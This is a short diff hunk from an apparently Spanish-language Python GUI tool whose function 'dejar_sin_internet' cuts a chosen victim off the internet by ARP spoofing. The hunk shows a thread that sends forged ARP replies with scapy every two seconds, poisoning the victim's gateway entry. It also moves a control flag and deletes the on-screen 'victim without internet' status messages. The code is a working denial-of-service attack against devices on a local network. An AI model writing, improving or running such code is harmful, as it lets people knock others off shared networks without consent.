@@ -118,18 +118,15 @@ def dejar_sin_internet():
         messagebox.showerror("Error", "No se pudieron obtener las MACs.")
         return
 
+    sniffing = True
+
     def spoof_bloqueo():
         while sniffing:
             send(ARP(op=2, pdst=objetivo_ip, psrc=gateway_ip, hwdst=mac_victima), verbose=False)
             time.sleep(2)
 
-    sniffing = True
     hilo_arp = threading.Thread(target=spoof_bloqueo, daemon=True)
     hilo_arp.start()
-
-    imprimir_salida(f"[!] Internet bloqueado para la víctima: {objetivo_ip}")
-    estado_bloqueo_label.config(text="Víctima sin Internet", bg="red")
-    estado_led_label.config(text="🔴 Sin Internet", fg="red")
 
 def imprimir_salida(texto):
     salida_text.config(state='normal')
